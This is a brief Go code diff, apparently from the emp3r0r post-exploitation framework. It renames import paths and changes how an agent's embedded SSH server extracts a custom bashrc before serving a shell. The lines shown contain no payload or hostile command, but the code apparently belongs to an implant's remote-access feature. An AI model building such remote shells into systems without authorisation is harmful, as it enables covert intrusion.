@@ -13,8 +13,8 @@ import (
 
 	"github.com/creack/pty"
 	"github.com/gliderlabs/ssh"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/external_files"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
+	"github.com/jm33-m0/emp3r0r/core/lib/external_file"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -58,7 +58,8 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 				s.Write([]byte(err.Error()))
 				return
 			}
-			err = external_files.ExtractBashRC()
+			bashrc := fmt.Sprintf("%s/.bashrc", common.RuntimeConfig.UtilsPath)
+			err = external_file.ExtractBashRC(custom_bash, bashrc)
 			if err != nil {
 				err = fmt.Errorf("sshd: extract built-in bashrc: %v", err)
 				log.Print(err)
